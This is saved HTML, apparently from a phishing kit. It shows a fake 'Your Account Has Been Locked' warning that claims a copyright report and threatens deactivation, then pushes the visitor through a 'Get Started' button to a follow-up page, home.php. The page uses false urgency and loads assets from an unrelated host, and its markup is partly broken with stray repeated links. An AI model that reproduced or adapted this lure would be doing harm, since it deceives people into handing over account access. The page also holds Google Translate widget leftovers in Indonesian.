...
<html lang="en" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    ...
    <link rel="apple-touch-icon" href="https://kudanifefe65g.anakembok.de./assets/icon.png">
    ...
    <link type="text/css" rel="stylesheet" charset="UTF-8" href="./assets/m=el_main_css.css">
</head>
...
<body>
    <div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id="">
            ...
            <div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c">
                <img src="./assets/24px.svg" width="24" height="24" alt="">
            </div>
            ...
            <div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr">
                <div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr">
                    ...
                    <div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Masukan Anda akan digunakan untuk membantu meningkatkan kualitas Google Terjemahan</div>
                </div>
                <div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr">
                    <button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Terjemahan bagus" aria-label="Terjemahan bagus" aria-pressed="false">
                    ...
                    <button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Terjemahan buruk" aria-label="Terjemahan buruk" aria-pressed="false">
            ...
            <div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce">
                <form id="goog-gt-votingForm" action="https://translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce">
                ...
                <iframe name="votingFrame" frameborder="0" src="./saved_resource.html"></iframe>
            </div>
        </div>
    </div>
    <div id="root">
                ...
                <div class="sc-jqCOkK kFZWwp">
                    <div class="sc-gGBfsJ jvrGcO">
                        <div class="sc-jnlKLf OHNdu">
                            ...
                            <center>
                                <img style="width: 120px;" alt="" src="./assets/Lock.png" class="identicon confirm-approve-content__identicon">
                            </center>
                            <div class="bro1">Your Account Has Been Locked</div>
                            <div class="bro2">Your account will soon be deactivated because someone has reported your account as violating copyright.</div>
                            <div class="p-3 mb-2 bg-secondary bg-opacity-25 text-dark rounded">
                                <div _ngcontent-cdd-c32="" class="row mb-1 detail">
                                    <div _ngcontent-cdd-c32="" class="col-10 text-left mb-3">
                                        <div class="bgColr">
                                            <img src="./assets/metalock.png" alt="" style="width: 38px;height: 35px;position: relative;right: -6px;top: 4px;" class="sc-tilXH gdtVXy">
                                            <div class="">
                                                <div class="bro3">
                                                    Account Locked on <script language="JavaScript">
                                                        document.write(tanggallengkap);
                                                    </script>
                                                </div>
                                                <div class="bro4">For the security and safety of other users we will immediately disable your account if you ignore this warning.</div>
                                            </div>
                                        </div>
                                        <div class="bro22">We will walk you through several steps to cancel a deactivated account.</div>
                                        <div class="sc-htoDjs cDnNqw">
                                            <a href="./home.php" class="ant-form ant-form-horizontal">
                                                <div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;">
                                                    <div class="ant-col ant-form-item-control"></div>
                                                </div>
                                                <div class="thepadding">
                                                    <button class="button sc-VigVT fWmldN" type="submit">Get Started</button>
                                                    <div1></div1>
                                                </div>
                                                
                                        </a></div><a href="./home.php" class="ant-form ant-form-horizontal">
                                        
                                    </a></div><a href="./home.php" class="ant-form ant-form-horizontal">
                                </a></div><a href="./home.php" class="ant-form ant-form-horizontal">
                            </a></div><a href="./home.php" class="ant-form ant-form-horizontal">
                            <strong _ngcontent-cdd-c32=""></strong>
                        </a></div><a href="./home.php" class="ant-form ant-form-horizontal"><strong _ngcontent-cdd-c32=""></strong>
                    </a></div><a href="./home.php" class="ant-form ant-form-horizontal">
                    <strong _ngcontent-cdd-c32="">
                        ...
                        <div class="wawobp loader" data-tenqwa="9fkuxe" style="display: none;">
                            <div class="yat5ls lodas" data-2ivb6w="2n92zq">
                                ...
                                <center>
                                    <div class="sc-fYxtnH hARKVj">
                                        <img src="./assets/sound-mobile.svg" alt="" style="height: 70px;width: 150px;" class="sc-tilXH gdtVXy">
                                    </div>
                                </center>
